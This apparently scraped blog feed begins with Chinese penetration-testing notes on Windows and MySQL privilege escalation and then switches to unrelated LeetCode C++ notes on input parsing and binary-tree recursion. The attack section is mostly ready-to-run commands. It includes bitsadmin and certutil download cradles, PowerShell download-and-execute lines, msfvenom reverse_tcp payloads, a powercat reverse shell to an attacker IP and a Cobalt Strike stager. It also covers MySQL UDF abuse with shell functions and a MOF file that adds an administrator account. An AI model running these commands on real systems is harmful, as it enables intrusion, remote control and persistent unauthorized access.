<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accesschk是微软提供的一款安全检查工具，是Sysintenals集合中的一款工具，作为确保他们创建安全环境Windows管理员通常需要知道特定用户或组对资源（包括文件、目录、注册表项、全局对象和Windows服务）拥有哪些类型的访问权限。</span><br><span class="line">accesschk.exe /accepteula( /accepteula一定要加上去，否则会自动弹出一个是否接收许可协议)</span><br><span class="line">-q          忽略banner</span><br><span class="line">-u          忽略错误</span><br><span class="line">-v          详细信息</span><br><span class="line">-w          只显示拥有可写权的对象</span><br><span class="line">accesschk.exe /accepteula -uvwqk &quot;路径可以根据WinPEAS返回结果填写&quot;</span><br></pre></td></tr></table></figure>

<p>系统内核溢出漏洞，而没有打相应补丁</p>
<h2 id="2-1-3-windows下载文件和加载木马"><a href="#2-1-3-windows下载文件和加载木马" class="headerlink" title="2.1.3 windows下载文件和加载木马"></a>2.1.3 windows下载文件和加载木马</h2><h3 id="windows下cmd窗口文件下载"><a href="#windows下cmd窗口文件下载" class="headerlink" title="windows下cmd窗口文件下载"></a>windows下cmd窗口文件下载</h3><h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>bitsadmin 可以用来在windows 命令行下下载文件。bitsadmin是windows 后台智能传输服务的一个工具，windows 的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。</p>
<p>bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。</p>
<p>bitsadmin 可以跟随URL跳转.</p>
<p>bitsadmin 不像curl wget 这类工具那样能用来下载HTML页面。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe c:\users\staccato\desktop\reverse.exe</span><br><span class="line"># &quot;任务名&quot; 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。</span><br><span class="line"></span><br><span class="line">#默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速</span><br><span class="line">start bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe  f:\reverse.exe</span><br><span class="line">bitsadmin /setpriority test foreground     #设置任务test为最高优先级</span><br></pre></td></tr></table></figure>

<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>一款下载文件的工具，自从WindowsServer 2003就自带。但是在Server 2003使用会有问题。也就是说，以下命令是在Win7及其以后的机器使用。但是该命令的使用会引发杀毒软件的查杀，所以在实际渗透中几乎不适用该命令.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe #下载文件到当前目录下</span><br><span class="line">certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe  c:/users/staccato/desktop/reserver.exe        #下载文件到指定目录下</span><br></pre></td></tr></table></figure>

<h4 id="iwr"><a href="#iwr" class="headerlink" title="iwr"></a>iwr</h4><p>PowerShell下的一款工具，所以我们如果在cmd下执行该命令的话，需要在前面加powershell命令，但是这会被安全软件检测到。所以在执行前，先进入powershell下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iwr -Uri http://www.test.com/vps.exe -OutFile vps.exe -UseBasicParsing</span><br></pre></td></tr></table></figure>

<h3 id="Window下加载执行PowerShell脚本"><a href="#Window下加载执行PowerShell脚本" class="headerlink" title="Window下加载执行PowerShell脚本"></a>Window下加载执行PowerShell脚本</h3><h4 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h4><p>在cmd当前目录下有PowerView.ps1脚本，并执行其中的Get-Netdomain模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass Import-Module .\powerview.ps1;Get-NetDomain</span><br></pre></td></tr></table></figure>

<h4 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h4><p>远程下载并执行test.ps1脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://xx.xx.xx.xx/test.ps1&#x27;)</span><br></pre></td></tr></table></figure>

<p>远程下载PowerView.ps1脚本，并执行其中的Get-Netdomain模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://xx.xx.xx.xx/powerview.ps1&#x27;);import-module .\powerview.ps1;Get-NetDomain</span><br></pre></td></tr></table></figure>

<h3 id="windows反弹shell"><a href="#windows反弹shell" class="headerlink" title="windows反弹shell"></a>windows反弹shell</h3><h4 id="cmd反弹msf-shell"><a href="#cmd反弹msf-shell" class="headerlink" title="cmd反弹msf shell"></a>cmd反弹msf shell</h4><p>首先在vps上操作</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.6.54.194 lport=7788 -f psh-reflection -o 7788.ps1        #生成木马文件 7788.ps1</span><br><span class="line">python -m SimpleHTTPServer 80  #开启web服务</span><br><span class="line">#MSF监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.6.54.194</span><br><span class="line">set lport 7788</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#目标机器上操作</span><br><span class="line">powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&quot;  #后台运行</span><br><span class="line">或者</span><br><span class="line">powershell -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="cmd窗口下利用Powershell反弹NC-shell"><a href="#cmd窗口下利用Powershell反弹NC-shell" class="headerlink" title="cmd窗口下利用Powershell反弹NC shell"></a><strong>cmd窗口下利用Powershell反弹NC shell</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 10.6.54.194 -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object System.Net.Webclient)DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 10.6.54.194  -p 8888 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>

<h4 id="cmd窗口下利用Powershell反弹cs-shell"><a href="#cmd窗口下利用Powershell反弹cs-shell" class="headerlink" title="cmd窗口下利用Powershell反弹cs shell"></a>cmd窗口下利用Powershell反弹cs shell</h4><p>注: windows10 经常性不能用。windows 2008R2以下百分百适用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.6.54.194:8080/a&#x27;))&quot;   #后台运行</span><br><span class="line"></span><br><span class="line">powershell.exe  -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.6.54.194:8080/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>工具和文件下载部分，参考先知社区<a href="https://xz.aliyun.com/t/12588">断*奏</a></p>
<h1 id="2-2Mysql提权"><a href="#2-2Mysql提权" class="headerlink" title="2.2Mysql提权"></a>2.2Mysql提权</h1><h2 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h2><p>拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；</p>
<p>尝试udf提权，其实质就是<code>以MySQL的身份执行系统命令</code></p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1.secure_file_priv为空，有导入导出权限</p>
<p>2.有上传目录</p>
<p>3.账号有insert何delete权限</p>
<p>mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建MySQL\Lib\Plugin\文件夹（<strong>通过菜刀连接创建</strong>、<br><strong>通过mysql语句创建</strong>），然后将udf.dll导入到该目录（如果不事先在靶机创建plugin目录，可以尝试<strong>利用NTFS ADS流来创建文件夹的方法</strong>，但是会出错）。<br>mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>dll常见函数</p>
<blockquote>
<ul>
<li>cmdshell 执行cmd;</li>
<li>downloader 下载者,到网上下载指定文件并保存到指定目录;</li>
<li>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</li>
<li>backshell 反弹Shell;</li>
<li>ProcessView 枚举系统进程;</li>
<li>KillProcess 终止指定进程;</li>
<li>regread 读注册表;</li>
<li>regwrite 写注册表;</li>
<li>shut 关机,注销,重启;</li>
<li>about 说明与帮助函数;</li>
</ul>
</blockquote>
<p><code>show variables like &quot;%plugin%&quot;</code>&#x2F;&#x2F;查看文件目录是否存在</p>
<p>将dll文件写入plugin目录,并且创建函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION shell RETURNS STRING SONAME &#x27;udf.dll&#x27;</span><br></pre></td></tr></table></figure>

<p>清除痕迹时记得drop…</p>
<p>总之就是，蚁剑连接后，可以上传一个udf大马，然后导出udf</p>
<p>再去创建cmdshell函数</p>
<p>然后利用这个函数，select cmdshell(‘whoami’)</p>
<p>可以创建反弹shell函数backshell</p>
<p>攻击机建立监听窗口，再远程执行shell反弹函数</p>
<p>利用反弹的shell，开启3389端口</p>
<p>创建用户，加入到管理员组。</p>
<p>攻击机利用创建的用户和密码进行远程桌面连接</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>(1)尽量避免提供对外链接，通过mysql中的user表进行查看，禁用“%”。</p>
<p>(2)设置复杂的Root账号密码。</p>
<p>(3)对my.ini设置只读属性，设置plugin目录为只读目录。</p>
<h2 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h2><p> mof是windows系统的一个文件，存储在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof，叫做”<strong>托管对象格式</strong>“，其作用是每隔五秒就会去监控进程创建和死亡。然而提权的原理就是在拥有了mysql的root权限以后(其实就是获得了MySQL的启动身份)，然后使用该权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs脚本段大多数写的是cmd的添加管理员用户的命令。</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>（1）操作系统版本：<strong>Windows Server 2003及以下版本</strong>；</p>
<p>（2）有MySQL数据库的连接数据；</p>
<p>（3）MySQL的配置文件my.ini中的<strong>secure-file-priv</strong>参数要为空(这个空不是NULL)；</p>
<p>（4）MySQL启动身份具<strong>有权限去读写</strong>c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录；</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>1.上传一句话，蚁剑连接；</p>
<p>假设获得了数据库的连接数据。<code>www/data/config.php</code></p>
<p>2.蚁剑连接数据库</p>
<p>执行命令</p>
<blockquote>
<p>select user(); 查看当前用户</p>
<p>show variables like “%secure%”; 查看secure-file-priv参数</p>
</blockquote>
<p>3.上传nullevt.mof文件到目标机的c:\recycler文件夹下，然后写入到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;  //5s执行一次 </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">	&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test01 123 /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators test01 /add\&quot;)&quot;;   //要执行的命令</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>上传后，执行语句</p>
<p><code>select load_file(&#39;CL\\RECYCLER\\nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;</code></p>
<p>如果写入失败就算了。</p>
<p>其实如果目标机设置了<strong>给MySQL的启动用户赋予完全控制mof文件夹以及子文件夹的权限</strong>的话，那就会写入成功。</p>
<p><strong>同时成功创建了test01管理员组用户</strong></p>
<p>其实写可以利用现成的mof.php文件，上传上去后，访问，进行一系列输入，自动写入mof文件。</p>
<h1 id="2-3linux提权"><a href="#2-3linux提权" class="headerlink" title="2.3linux提权"></a>2.3linux提权</h1><p>Suid提权：普通用户去执行 root 权限的操作，而不需要知道 root 的密码<br>第三方软件提权</p>
]]></content>
      <categories>
        <category>系统提权</category>
        <category>MYSQL提权</category>
      </categories>
      <tags>
        <tag>系统提权</tag>
        <tag>MYSQL提权</tag>
      </tags>
  </entry>
  <entry>
    <title>力扣</title>
    <url>/2023/07/02/%E5%8A%9B%E6%89%A3/</url>
    <content><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>vscode默认不支持c++11解决办法</p>
<p><a href="https://zhuanlan.zhihu.com/p/269244754">vscode C++ 简易配置（支持c++11以上） - 知乎 (zhihu.com)</a></p>
<h2 id="单行输入，过滤逗号"><a href="#单行输入，过滤逗号" class="headerlink" title="单行输入，过滤逗号"></a>单行输入，过滤逗号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; s;</span><br><span class="line"> int temp;</span><br><span class="line">   while(cin&gt;&gt;temp)</span><br><span class="line">   &#123;</span><br><span class="line">       s.emplace_back(temp); //可以过滤逗号</span><br><span class="line">       if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">   &#125;</span><br><span class="line"> for(int i:s)</span><br><span class="line">   cout&lt;&lt;i&lt;&lt;&quot; &quot;;</span><br></pre></td></tr></table></figure>

<h2 id="多行输入，外部以回车分割"><a href="#多行输入，外部以回车分割" class="headerlink" title="多行输入，外部以回车分割"></a>多行输入，外部以回车分割</h2><p>内部如果是空格分割</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  int n,m;</span><br><span class="line"></span><br><span class="line"> cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line"></span><br><span class="line"> getchar();//取走回车，为了下面的getline</span><br><span class="line"></span><br><span class="line">vector&lt;string&gt;sw;</span><br><span class="line"></span><br><span class="line">for(int i=0;i&lt;m;i++)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> string s,tmp;</span><br><span class="line"></span><br><span class="line"> getline(cin,s);</span><br><span class="line"></span><br><span class="line"> istringstream ss(s);</span><br><span class="line"></span><br><span class="line"> while(ss&gt;&gt;tmp)&#123;</span><br><span class="line"></span><br><span class="line">   sw.push_back(tmp);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(string i:sw)</span><br><span class="line"></span><br><span class="line"> cout&lt;&lt;i&lt;&lt;&quot; &quot;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1<br>2<br>1 1 2 3<br>4 5 6 7<br>1 2 3 5 6 7 sw的元素个数为6</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while(getline(ss,tmp,&#x27;,&#x27;)) //逗号分割</span><br></pre></td></tr></table></figure>

<blockquote>
<p>3<br>2<br>1,2,3,4,5,6<br>7,8,9,10,11<br>1 2 3 4 5 6 7 8 9 10 11 sw的总数为11</p>
</blockquote>
<h2 id="外行输入，多个数组"><a href="#外行输入，多个数组" class="headerlink" title="外行输入，多个数组"></a>外行输入，多个数组</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;string&gt; sw;</span><br><span class="line"></span><br><span class="line"> string s;</span><br><span class="line"></span><br><span class="line"> int n;</span><br><span class="line"></span><br><span class="line"> cin&gt;&gt;n;</span><br><span class="line"></span><br><span class="line"> getchar(); //否则，n=2时，下文的getline只读一行，因为之前的回车读到了</span><br><span class="line"></span><br><span class="line"> // cin.ignore();</span><br><span class="line"></span><br><span class="line"> for(int i=0;i&lt;n;i++)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  getline(cin,s);//默认分隔符为&#x27;\n&#x27; cin会默认去除\n</span><br><span class="line"></span><br><span class="line">  sw.push_back(s);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>2<br>1,2<br>5,7<br>1,2 5,7 </p>
</blockquote>
<p>我再用string转化一波吧</p>
<p>还有另一个做法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;string&gt; sw(2,&quot;&quot;);</span><br><span class="line">  string s;</span><br><span class="line">  for(int i=0;i&lt;2;i++)</span><br><span class="line">  &#123;</span><br><span class="line"> </span><br><span class="line">       getline(cin,s);</span><br><span class="line">       sw[i]=s;//如果是vector&lt;string&gt; sw;那就用push_back，因为这样定义是没有索引的。</span><br><span class="line">  &#125;</span><br><span class="line">    for(string i:sw)</span><br><span class="line">   cout&lt;&lt;i&lt;&lt;&quot; &quot;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1,2,3<br>4,5<br>1,2,3 4,5 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">getline(cin,sw[i]);也可以</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="基于struct的存储"><a href="#基于struct的存储" class="headerlink" title="基于struct的存储"></a>基于struct的存储</h2><p>struct book{</p>
<p>int a;</p>
<p>int b;</p>
<p>};</p>
<p>vector&lt;book&gt; a(n); </p>
<h2 id="关于每行两元素的存储"><a href="#关于每行两元素的存储" class="headerlink" title="关于每行两元素的存储"></a>关于每行两元素的存储</h2><p>以下根据实际情况等价替代</p>
<p>map&lt;int,int&gt; mp;</p>
<p>vector&lt;pair&lt;int,int&gt; &gt; a;</p>
<blockquote>
<p>pair&lt;int,int&gt; p&#x3D;make_pair(3,4);</p>
</blockquote>
<p>vector&lt;vector&lt;int&gt; &gt; a;</p>
<p>vector&lt;book&gt; a;</p>
<h1 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h1><p><strong>数据结构的存储方式</strong>：数组和链表</p>
<p><strong>数据结构的基本操作</strong>：遍历+访问</p>
<p>线性就是for&#x2F;while迭代，否则就是递归(二叉树)</p>
<p>线性表略</p>
<p>链表</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">listnode</span>&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	listnode next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">traverse</span><span class="params">(listnode head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(listnode p=head;p!=null;p=p-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//迭代访问p.val</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//或者递归访问head.val</span></span><br><span class="line">	<span class="built_in">traverse</span>(head-&gt;next)</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二叉树</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Treenode</span>&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	Treenode left,right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">traverse</span><span class="params">(Treenode root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">traverse</span>(root.left);</span><br><span class="line"><span class="built_in">traverse</span>(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>N叉树</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Treenode&#123;</span><br><span class="line">	int val;</span><br><span class="line">	Treenode[] children;</span><br><span class="line">&#125;</span><br><span class="line">void traverse(Treenode root)</span><br><span class="line">&#123;</span><br><span class="line">	for(Treenode child:root.children)</span><br><span class="line">    	traverse(child);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进而扩展为图，图就相当于N叉树的结合体</p>
<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>二叉树基本遍历比如</p>
<p>travers(root.left);&#x2F;&#x2F;一直往左遍历，直到root为null，会跳到下一行</p>
<p>travers(root.right);&#x2F;&#x2F;一直往右遍历，直到root为null，会跳到下一行，若是递归，则会再从该行开始（一般是先左子树，左子树遍历完，轮到右子树）</p>
<p><strong>单链表的倒序问题</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void travers(treenode * head)</span><br><span class="line">&#123;</span><br><span class="line">	if(head==nullptr) return;</span><br><span class="line">	travers(head-&gt;next);</span><br><span class="line">	cout&lt;&lt;head-&gt;val;</span><br><span class="line">	</span><br><span class="line">	//实现5-&gt;4-&gt;3-&gt;2-&gt;1</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>递归就相当于个栈，递归终止之后，就不停的pop栈顶元素</strong></p>
<blockquote>
<p>当递归函数调用结束后，系统会负责将函数的返回值从栈中取出，并将控制权返回给调用该函数的地方。系统会将返回值传递给上一层的递归调用，使得上一层递归函数可以继续执行后续的操作。</p>
</blockquote>
<p>二叉树问题，分为回溯法(一遍二叉树遍历)和动态规划(分解问题，有返回值)</p>
<h2 id="避坑点"><a href="#避坑点" class="headerlink" title="避坑点"></a>避坑点</h2><p><strong>思考整棵树与其左右字数关系</strong>，类似数学归纳法。</p>
<p>当程序”递“时，计算机栈保存该对象，程序不断”递“，计算机不断压栈；边界时，程序不断发生”归“的动作时，计算机不断出栈。</p>
<h2 id="104二叉树最大深度"><a href="#104二叉树最大深度" class="headerlink" title="104二叉树最大深度"></a>104二叉树最大深度</h2><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int depth=0;</span><br><span class="line">    int res=0;//记录最大值</span><br><span class="line">    </span><br><span class="line">    int maxDepth(TreeNode* root) &#123; //单纯访问</span><br><span class="line">        travers(root);</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">    void travers(TreeNode* root)</span><br><span class="line">    &#123;</span><br><span class="line">      if(root==nullptr) return;</span><br><span class="line">       depth++;</span><br><span class="line">       res=max(depth,res);</span><br><span class="line">       travers(root-&gt;left);</span><br><span class="line">       travers(root-&gt;right);</span><br><span class="line">       depth--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">//将depth理解为在二叉树上游走的指针即可</span><br></pre></td></tr></table></figure>

<p>递归，遇见终止的，就释放，回到原位置</p>
<h3 id="分解"><a href="#分解" class="headerlink" title="分解"></a>分解</h3><p><img src="/../../../Typora/img111/image-20230711221213896.png" alt="image-20230711221213896"></p>
<p>原问题：计算3为根节点的二叉树的深度。<br>子问题：计算9为根节点的二叉树的深度。<br>子问题：计算20为根节点的二叉树的深度。<br>所谓子问题就是和原问题一样，只是规模降低了。</p>
<p>当前节点深度&#x3D;max(左节点深度，右节点深度)+1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int getdepth(TreeNode *root)</span><br><span class="line">   &#123;</span><br><span class="line">       if(root==nullptr) return 0;   //叶子结点</span><br><span class="line">       int leftmax=getdepth(root-&gt;left);</span><br><span class="line">       int rightmax=getdepth(root-&gt;right);</span><br><span class="line"></span><br><span class="line">       return 1+max(leftmax,rightmax);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="144-二叉树前序遍历"><a href="#144-二叉树前序遍历" class="headerlink" title="144 二叉树前序遍历"></a>144 二叉树前序遍历</h2><p>给你二叉树的根节点 <code>root</code> ，返回它节点值的 <strong>前序</strong> 遍历。</p>
<h3 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">travers</span>(root);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">travers</span><span class="params">(TreeNode *root)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        s.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">travers</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">travers</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="分解-1"><a href="#分解-1" class="headerlink" title="分解"></a>分解</h3><p>聚焦于子问题，类似于数学归纳法，子问题的逻辑正确，整体问题一定解决。</p>
<p>前序遍历就是根节点+左子树遍历<strong>结果</strong>+右子树遍历<strong>结果</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; s;<span class="comment">//根节点，左子树，右子树</span></span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">       s.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; left=<span class="built_in">preorderTraversal</span>(root-&gt;left);</span><br><span class="line">       s.<span class="built_in">insert</span>(s.<span class="built_in">end</span>(),left.<span class="built_in">begin</span>(),left.<span class="built_in">end</span>());</span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; right=<span class="built_in">preorderTraversal</span>(root-&gt;right);</span><br><span class="line">       s.<span class="built_in">insert</span>(s.<span class="built_in">end</span>(),right.<span class="built_in">begin</span>(),right.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h2 id="后序位置的妙用"><a href="#后序位置的妙用" class="headerlink" title="后序位置的妙用"></a>后序位置的妙用</h2><p>1.把根节点当做第1层，打印出每个节点所在层数  （前序）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void traverse(TreeNode* root,int level)</span><br><span class="line">&#123;</span><br><span class="line">	if(root==nullptr) return;</span><br><span class="line">	printf(&quot;节点%s在第%d层&quot;,root,level);</span><br><span class="line">	traverse(root-&gt;left,level+1);</span><br><span class="line">	traverse(root-&gt;right,level+1);</span><br><span class="line">&#125;</span><br><span class="line">//调用</span><br><span class="line">traverse(root,1);</span><br></pre></td></tr></table></figure>

<p>2.打印每个结点的左右子树各有多少结点	（后序）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int count(TreeNode* root)&#123;</span><br><span class="line">if(root==nullptr) return 0;</span><br><span class="line">int leftco=count(root-&gt;left);</span><br><span class="line">int rightco=count(toor-&gt;right);</span><br><span class="line">//后序位置</span><br><span class="line">printf(...)</span><br><span class="line"></span><br><span class="line">return leftco+rightco+1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个问题区别在于，第一个是递归时<strong>顺便</strong>带来的结果；第二个需要<strong>遍历完</strong>整棵树，才知道的结果</p>
